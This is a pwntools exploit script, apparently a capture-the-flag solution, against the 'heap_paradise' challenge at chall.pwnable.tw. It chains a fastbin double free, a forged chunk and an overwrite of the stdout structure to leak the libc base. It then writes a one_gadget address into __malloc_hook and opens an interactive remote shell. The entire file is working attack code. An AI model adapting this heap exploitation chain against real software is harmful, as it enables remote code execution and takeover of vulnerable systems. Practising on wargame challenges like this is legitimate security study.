```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./heap_paradise_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


debug = 0


if args.LOCAL:
    #r = process([exe.path])
    if debug==1:
        gdb.attach(r, gdbscript='''
            start
            ''')
    #input()
else:
    r = remote("chall.pwnable.tw", 10308)


def allocate(r, size, data):
    r.sendlineafter(b'You Choice:', b'1')
    r.sendlineafter(b'Size :', f"{size}".encode())
    r.sendafter(b'Data :', data)

def free(r, index):
    r.sendlineafter(b'You Choice:', b'2')
    r.sendlineafter(b'Index :', f"{index}".encode())


def main():

    #### NOTE: When you run this program, if you receive "[*] libc:  0x2a2a29edf14a" -> run the program again ^^
    while True:


        
        r = remote("chall.pwnable.tw", 10308)
        #r = process([exe.path])


        # Fastbin dup
        allocate(r, 0x68, p64(0)*3 + p64(0x71)) # index 0
        allocate(r, 0x68, p64(0)*9 + p64(0x21)) # index 1
        free(r, 0)
        free(r, 1)
        free(r, 0)
        
        allocate(r, 0x68, b'\x20') # index 2 = index 0
        allocate(r, 0x68, b'A') # index 3 = index 1
        allocate(r, 0x68, b'B') # index 4 = index 2 = index 0
        allocate(r, 0x68, b'C') # index 5 - Fake chunk



        free(r, 0)
        allocate(r, 0x68, p64(0)*3 + p64(0xa1)) # index 6 - modify size of chunks[index=5] (fake chunk) to 0xa0


        free(r, 5) # get unsorted bin address

        free(r, 0)
        free(r, 1)
        # fastbin[size = 0x70] -> index 1 -> index 0


        allocate(r, 0x78, p64(0)*9+p64(0x71)+b"\xa0") # index 7
        # fastbin[size = 0x70] -> index 1 -> fake chunk (now size is 0x20) -> unsorted bin?




        allocate(r, 0x68, p64(0)*5+p64(0x71)+b"\xdd\x65")
        # fastbin[size = 0x70] -> fake chunk (now size is 0x70) -> fake chunk (near stdout, size=0x7f to bypass the fastbin's check)
        



        allocate(r, 0x68, b'abc')
        # fastbin[size = 0x70] -> fake chunk (near stdout, size=0x7f to bypass the fastbin's check)


        flag = 0xfbad1800
        payload = b"\x00"*0x33 + p64(flag) + p64(0)*3 + b"\x88"

        try:
            allocate(r, 0x68, payload)
        except EOFError:
            print('[*] fail')
            r.close()
            continue

        print('[*] success')
        libc.address = u64(r.recv(6) + b"\x00\x00") - 0x3c38e0
        print("[*] libc: ", hex(libc.address))

        malloc_hook = libc.sym['__malloc_hook']
        one_gadget = libc.address + 0xef6c4


        free(r, 7)
        free(r, 1)

        allocate(r, 0x78, p64(0)*9+p64(0x71)+p64(malloc_hook-0x23))
        allocate(r, 0x68, b"abc")


        allocate(r, 0x68, b"\x00"*0x13+p64(one_gadget))


        r.sendlineafter(b"You Choice:", b"1")
        r.sendlineafter(b"Size :", b"1")

        r.interactive()





    #r.interactive()


if __name__ == "__main__":
    main()

```
